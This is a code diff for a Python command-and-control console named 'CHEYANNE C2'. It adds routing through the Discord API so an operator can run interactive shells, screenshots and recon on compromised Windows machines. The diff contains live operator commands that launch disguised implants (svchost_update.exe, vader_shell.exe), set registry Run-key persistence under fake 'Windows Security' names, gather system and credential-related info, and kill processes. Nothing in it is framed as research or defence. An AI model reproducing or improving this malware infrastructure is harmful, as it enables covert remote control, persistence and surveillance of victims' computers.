@@ -232,6 +232,64 @@ class VaderC2:
             except Exception:
                 pass
 
+    def find_session(self, sid_prefix=""):
+        if sid_prefix:
+            matches = [s for s in self.sessions if s.startswith(sid_prefix)]
+        else:
+            matches = list(self.sessions.keys())
+        tcp = [s for s in matches if self.sessions[s].channel == "tcp" and self.sessions[s].alive]
+        if tcp:
+            return self.sessions[tcp[0]]
+        disc = [s for s in matches if self.sessions[s].channel == "discord"]
+        if disc:
+            return self.sessions[disc[0]]
+        return None
+
+    def send_to_session(self, s, cmd_str):
+        if s.channel == "tcp" and s.alive:
+            try:
+                s.sock.sendall((cmd_str + "\n").encode("utf-8"))
+                return True
+            except Exception:
+                return False
+        elif s.channel == "discord":
+            return self.send_discord_cmd(s.id, cmd_str)
+        return False
+
+    def send_discord_cmd(self, session_id, command):
+        if not self.bot_token or not self.channel_id:
+            return False
+        url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages"
+        headers = {"Authorization": f"Bot {self.bot_token}"}
+        payload = json.dumps({"type": "cmd", "session": session_id, "command": command})
+        status = http_post(url, {"content": payload}, headers)
+        return 200 <= status < 300
+
+    def poll_discord_output(self, session_id, timeout=15):
+        start = time.time()
+        seen = set()
+        msgs = self.read_channel(limit=5)
+        for m in msgs:
+            seen.add(m.get("id", ""))
+
+        while time.time() - start < timeout:
+            time.sleep(2)
+            msgs = self.read_channel(limit=10)
+            for msg in reversed(msgs):
+                msg_id = msg.get("id", "")
+                if msg_id in seen:
+                    continue
+                seen.add(msg_id)
+                content = msg.get("content", "").strip()
+                try:
+                    data = json.loads(content)
+                    if (data.get("type") == "output" and
+                        data.get("session") == session_id):
+                        return data.get("data", "")
+                except (json.JSONDecodeError, KeyError):
+                    pass
+        return None
+
     # ── TCP Listener ──
 
     def start_listener(self):
@@ -451,9 +509,13 @@ class VaderC2:
             print(f"  {AMBER}[*] Type 'back' to return. Commands execute live.{RST}\n")
             self._tcp_interact(s)
         elif s.channel == "discord":
-            print(f"\n  {AMBER}[*] Beacon-only session: {s.id} ({s.tag()}){RST}")
-            print(f"  {AMBER}[*] No interactive shell — beacon can only receive heartbeats/recon{RST}")
-            print(f"  {MUTED}[*] Deploy cheyanne_shell.exe on target for interactive access{RST}\n")
+            if not self.bot_token or not self.channel_id:
+                print(f"  {RED}[!] Discord bot token or channel ID not set — can't send commands{RST}")
+            else:
+                print(f"\n  {GREEN}[*] Interactive shell: {s.id} ({s.tag()}) via Discord{RST}")
+                print(f"  {AMBER}[*] Type 'back' to return. Commands route through Discord API.{RST}")
+                print(f"  {MUTED}[*] Latency: ~5-10s per command (polling interval){RST}\n")
+                self._discord_interact(s)
         else:
             print(f"  {RED}[!] Session {session_id} is dead{RST}")
 
@@ -494,6 +556,42 @@ class VaderC2:
                 if not s.alive:
                     print(f"  {RED}[!] Connection lost{RST}")
                     break
+
+        except KeyboardInterrupt:
+            print(f"\n  {MUTED}[*] Returning...{RST}")
+
+        self.active_session = None
+        print(f"\n  {CYAN}[*] Back to CHEYANNE C2 console{RST}\n")
+
+    def _discord_interact(self, s):
+        try:
+            while self.running:
+                try:
+                    prompt = f"  {AMBER}{s.hostname}{RST}{DIM}>{RST} "
+                    cmd = input(prompt)
+                except (EOFError, KeyboardInterrupt):
+                    break
+
+                cmd = cmd.strip()
+                if not cmd:
+                    continue
+                if cmd.lower() == "back":
+                    break
+
+                self.log_event("command_sent", s.id, cmd)
+                print(f"  {DIM}[*] Sending via Discord...{RST}")
+
+                if not self.send_discord_cmd(s.id, cmd):
+                    print(f"  {RED}[!] Failed to send command to Discord{RST}")
+                    continue
+
+                output = self.poll_discord_output(s.id, timeout=30)
+                if output:
+                    print(output)
+                    self.log_event("output_recv", s.id, output)
+                    s.last_seen = datetime.now()
+                else:
+                    print(f"  {AMBER}[*] No response within 30s — implant may be offline{RST}")
 
         except KeyboardInterrupt:
             print(f"\n  {MUTED}[*] Returning...{RST}")
@@ -565,7 +663,7 @@ class VaderC2:
   {CYAN}── CHEYANNE C2 v2 Commands ──{RST}
 
     {WHITE}sessions / ls{RST}              List all sessions (shell + beacon)
-    {WHITE}interact <id>{RST}              Interactive shell (TCP sessions)
+    {WHITE}interact <id>{RST}              Interactive shell (TCP or Discord sessions)
     {WHITE}ref{RST}                        Target command cheat sheet
     {WHITE}log{RST}                        Show command history
     {WHITE}train{RST}                      Post training log to #c2
@@ -583,7 +681,7 @@ class VaderC2:
 
   {DIM}Partial session IDs work — 'interact c0' matches 'c0205271'{RST}
   {DIM}TCP sessions marked with * are live shells{RST}
-  {DIM}Discord sessions are beacon-only (recon + heartbeat){RST}
+  {DIM}Discord sessions support full interactive shell (via API polling){RST}
   {DIM}Shortcuts auto-find first TCP session if no sid given{RST}
 """)
 
@@ -666,11 +764,10 @@ class VaderC2:
                 # ── SHORTCUTS ──
                 elif cmd == "deploy":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
-                    if not matches:
-                        print(f"  {RED}[!] No TCP session matching '{sid}'. Use 'sessions' to find one.{RST}")
+                    s = self.find_session(sid)
+                    if not s:
+                        print(f"  {RED}[!] No session matching '{sid}'. Use 'sessions' to find one.{RST}")
                     else:
-                        s = self.sessions[matches[0]]
                         try:
                             _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                             _s.connect(("8.8.8.8", 80))
@@ -689,20 +786,29 @@ class VaderC2:
                             f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'; '
                             f'Start-Process \'C:\\Users\\Public\\vader_shell.exe\'"'
                         )
-                        print(f"  {AMBER}[*] Deploying implant + shell via {matches[0][:8]}...{RST}")
-                        try:
-                            s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
+                        print(f"  {AMBER}[*] Deploying via {s.id[:8]} ({s.channel})...{RST}")
+                        if self.send_to_session(s, deploy_cmd):
                             print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell (C2 baked in){RST}")
-                        except Exception as e:
-                            print(f"  {RED}[!] Send failed: {e}{RST}")
+                        else:
+                            print(f"  {RED}[!] Send failed{RST}")
 
                 elif cmd == "screenshot":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
-                    if not matches:
-                        print(f"  {RED}[!] No TCP session matching '{sid}'. Need interactive shell.{RST}")
+                    s = self.find_session(sid)
+                    if not s:
+                        print(f"  {RED}[!] No session matching '{sid}'.{RST}")
+                    elif s.channel == "discord":
+                        print(f"  {AMBER}[*] Requesting screenshot via Discord ({s.id[:8]})...{RST}")
+                        if self.send_discord_cmd(s.id, "SCREENSHOT"):
+                            output = self.poll_discord_output(s.id, timeout=30)
+                            if output:
+                                print(f"  {GREEN}[+] {output}{RST}")
+                            else:
+                                print(f"  {AMBER}[*] No response — check Discord channel for attachment{RST}")
+                        else:
+                            print(f"  {RED}[!] Failed to send command{RST}")
                     else:
-                        s = self.sessions[matches[0]]
+                        s = s
                         try:
                             _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                             _s.connect(("8.8.8.8", 80))
@@ -775,11 +881,13 @@ class VaderC2:
                 elif cmd == "watch":
                     interval = int(args[0]) if args and args[0].isdigit() else 5
                     sid = args[1] if len(args) > 1 else (args[0] if args and not args[0].isdigit() else "")
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
-                    if not matches:
-                        print(f"  {RED}[!] No TCP session.{RST}")
+                    s = self.find_session(sid)
+                    if not s:
+                        print(f"  {RED}[!] No session available.{RST}")
+                    elif s.channel == "discord":
+                        print(f"  {AMBER}[!] Watch requires TCP — live streaming can't route through Discord API.{RST}")
+                        print(f"  {DIM}  Use 'screenshot' for single captures via Discord.{RST}")
                     else:
-                        s = self.sessions[matches[0]]
                         try:
                             _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                             _s.connect(("8.8.8.8", 80))
@@ -919,46 +1027,41 @@ setInterval(grab,{interval*1000});
                     else:
                         proc_name = args[0]
                         sid = args[1] if len(args) > 1 else ""
-                        matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
-                        if not matches:
-                            print(f"  {RED}[!] No TCP session. Interact first.{RST}")
+                        s = self.find_session(sid)
+                        if not s:
+                            print(f"  {RED}[!] No session available.{RST}")
                         else:
-                            s = self.sessions[matches[0]]
                             kill_cmd = f"taskkill /F /IM {proc_name}"
-                            try:
-                                s.sock.sendall((kill_cmd + "\n").encode("utf-8"))
-                                print(f"  {GREEN}[+] Sent: {kill_cmd}{RST}")
-                            except Exception as e:
-                                print(f"  {RED}[!] {e}{RST}")
+                            if self.send_to_session(s, kill_cmd):
+                                print(f"  {GREEN}[+] Sent via {s.channel}: {kill_cmd}{RST}")
+                            else:
+                                print(f"  {RED}[!] Send failed{RST}")
 
                 elif cmd == "recon":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
-                    if not matches:
-                        print(f"  {RED}[!] No TCP session.{RST}")
+                    s = self.find_session(sid)
+                    if not s:
+                        print(f"  {RED}[!] No session available.{RST}")
                     else:
-                        s = self.sessions[matches[0]]
                         recon_cmd = "systeminfo & ipconfig /all & whoami /all & tasklist /v"
-                        print(f"  {AMBER}[*] Running recon on {matches[0][:8]}...{RST}")
-                        try:
-                            s.sock.sendall((recon_cmd + "\n").encode("utf-8"))
-                        except Exception as e:
-                            print(f"  {RED}[!] {e}{RST}")
+                        print(f"  {AMBER}[*] Running recon on {s.id[:8]} ({s.channel})...{RST}")
+                        if self.send_to_session(s, recon_cmd):
+                            if s.channel == "discord":
+                                print(f"  {DIM}[*] Waiting for response via Discord...{RST}")
+                                output = self.poll_discord_output(s.id, timeout=30)
+                                if output:
+                                    print(output)
+                                else:
+                                    print(f"  {AMBER}[*] No response — check Discord channel{RST}")
+                        else:
+                            print(f"  {RED}[!] Send failed{RST}")
 
                 elif cmd == "persist":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
-                    if not matches:
-                        print(f"  {RED}[!] No TCP session.{RST}")
+                    s = self.find_session(sid)
+                    if not s:
+                        print(f"  {RED}[!] No session available.{RST}")
                     else:
-                        s = self.sessions[matches[0]]
-                        try:
-                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                            _s.connect(("8.8.8.8", 80))
-                            my_ip = _s.getsockname()[0]
-                            _s.close()
-                        except Exception:
-                            my_ip = "192.168.1.92"
                         persist_cmd = (
                             'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                             '/v WindowsSecurityHealth /t REG_SZ '
@@ -967,13 +1070,12 @@ setInterval(grab,{interval*1000});
                             '/v WindowsSecurityUpdate /t REG_SZ '
                             '/d "C:\\Users\\Public\\vader_shell.exe" /f'
                         )
-                        try:
-                            s.sock.sendall((persist_cmd + "\n").encode("utf-8"))
-                            print(f"  {GREEN}[+] Persistence set:{RST}")
+                        if self.send_to_session(s, persist_cmd):
+                            print(f"  {GREEN}[+] Persistence set via {s.channel}:{RST}")
                             print(f"  {GREEN}    WindowsSecurityHealth  → Discord implant{RST}")
                             print(f"  {GREEN}    WindowsSecurityUpdate  → TCP shell (C2 IP baked in at compile){RST}")
-                        except Exception as e:
-                            print(f"  {RED}[!] {e}{RST}")
+                        else:
+                            print(f"  {RED}[!] Send failed{RST}")
 
                 else:
                     print(f"  {RED}[!] Unknown: {cmd}. Type 'help'{RST}")
@@ -1016,9 +1118,9 @@ def run_tcp_cmd(tcp_cmd_str):
 
     time.sleep(2)
 
-    tcp_sessions = [sid for sid, s in c2.sessions.items() if s.channel == "tcp" and s.alive]
-    if not tcp_sessions:
-        print(f"  {RED}[!] No TCP session found. Connect a shell first.{RST}")
+    s = c2.find_session("")
+    if not s:
+        print(f"  {RED}[!] No session found (TCP or Discord). Connect first.{RST}")
         c2.running = False
         return
 
@@ -1026,9 +1128,8 @@ def run_tcp_cmd(tcp_cmd_str):
     cmd = parts[0].lower()
     args = parts[1:]
 
-    sid = tcp_sessions[0]
-    s = c2.sessions[sid]
-    print(f"  {GREEN}[+] Using session {sid[:8]} for TCP command: {tcp_cmd_str}{RST}")
+    sid = s.id
+    print(f"  {GREEN}[+] Using session {sid[:8]} ({s.channel}) for command: {tcp_cmd_str}{RST}")
 
     try:
         _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
